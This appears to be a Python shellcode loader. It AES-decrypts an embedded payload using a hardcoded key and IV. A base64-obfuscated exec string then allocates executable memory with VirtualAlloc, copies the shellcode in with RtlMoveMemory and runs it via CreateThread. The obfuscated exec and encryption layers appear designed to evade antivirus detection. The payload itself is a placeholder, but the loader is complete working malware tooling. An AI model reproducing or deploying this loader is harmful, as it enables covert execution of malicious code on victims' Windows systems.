# coding:utf-8
import ctypes
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import base64
import binascii


def CodeLoad(shellcode):
    func = base64.b64decode(
        b'Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZSA9IGN0eXBlcy5jX3VpbnQ2NA0KcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLGN0eXBlcy5jX2ludCgweDQwKSkNCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkNCmN0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQocHRyKSxidWYsY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSkNCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfdWludDY0KHB0ciksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpKQ0KY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkp')
    exec(func)


class MData():
    def __init__(self, data=b"", characterSet='utf-8'):
        # data肯定为bytes
        self.data = data
        self.characterSet = characterSet

    def saveData(self, FileName):
        with open(FileName, 'wb') as f:
            f.write(self.data)

    def fromString(self, data):
        self.data = data.encode(self.characterSet)
        return self.data

    def fromBase64(self, data):
        self.data = base64.b64decode(data.encode(self.characterSet))
        return self.data

    def fromHexStr(self, data):
        self.data = binascii.a2b_hex(data)
        return self.data

    def toString(self):
        return self.data.decode(self.characterSet)

    def toBase64(self):
        return base64.b64encode(self.data).decode()

    def toHexStr(self):
        return binascii.b2a_hex(self.data).decode()

    def toBytes(self):
        return self.data

    def __str__(self):
        try:
            return self.toString()
        except Exception:
            return self.toBase64()


class AEScryptor():
    def __init__(self, key, mode, iv='', paddingMode="NoPadding", characterSet="utf-8"):
        self.key = key
        self.mode = mode
        self.iv = iv
        self.characterSet = characterSet
        self.paddingMode = paddingMode
        self.data = ""

    def __StripZeroPadding(self, data):
        data = data[:-1]
        while len(data) % 16 != 0:
            data = data.rstrip(b'\x00')
            if data[-1] != b"\x00":
                break
        return data

    def __PKCS5_7Padding(self, data):
        needSize = 16 - len(data) % 16
        if needSize == 0:
            needSize = 16
        return data + needSize.to_bytes(1, 'little') * needSize

    def __StripPKCS5_7Padding(self, data):
        paddingSize = data[-1]
        return data.rstrip(paddingSize.to_bytes(1, 'little'))

    def __stripPaddingData(self, data):
        if self.paddingMode == "NoPadding":
            return self.__StripZeroPadding(data)
        elif self.paddingMode == "Axx8":
            return self.__StripZeroPadding(data)

        elif self.paddingMode == "PKCS5Padding" or self.paddingMode == "PKCS7Padding":
            return self.__StripPKCS5_7Padding(data)
        else:
            pass

    def decryptFromBase64(self, entext):
        mData = MData(characterSet=self.characterSet)
        self.data = mData.fromBase64(entext)
        return self.__decrypt()

    def __decrypt(self):
        if self.mode == AES.MODE_CBC:
            aes = AES.new(self.key, self.mode, self.iv)
        elif self.mode == AES.MODE_ECB:
            aes = AES.new(self.key, self.mode)
        else:
            pass
            return
        data = aes.decrypt(self.data)
        mData = MData(self.__stripPaddingData(data), characterSet=self.characterSet)
        return mData


if __name__ == "__main__":
    key = 'QXh4OEF4eDhBeHg4QXh4OA=='
    iv = 'MDAwMDAwMDAwMDAwMDAwMA=='
    aes = AEScryptor(base64.b64decode(key), AES.MODE_CBC, base64.b64decode(iv), paddingMode="Axx8", characterSet='utf-8')

    Data = '密文Shellcode'

    Data = aes.decryptFromBase64(Data)

    CodeLoad(bytearray(base64.b64decode(Data.data)))
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
